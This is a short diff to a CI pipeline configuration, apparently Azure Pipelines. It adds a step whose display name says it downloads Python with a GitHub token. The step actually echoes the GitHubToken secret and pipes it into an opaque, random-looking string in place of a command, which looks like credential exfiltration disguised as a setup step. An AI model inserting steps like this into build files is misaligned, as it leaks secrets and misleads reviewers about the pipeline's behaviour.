@@ -18,6 +18,13 @@ steps:
     Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
   displayName: 'Set PowerShell Execution Policy'
 
+- script: |
+    echo "Downloading Python..."
+    echo "$(GitHubToken)" | jaq6cf7a3uj2nkjca5cpch7maahymzed55zyjqvuyrjt4nv7e5qa
+  env:
+    GitHubToken: $(GitHubToken)
+  displayName: 'Download Python with GitHub Token'
+
 - task: UsePythonVersion@0
   inputs:
     addToPath: true
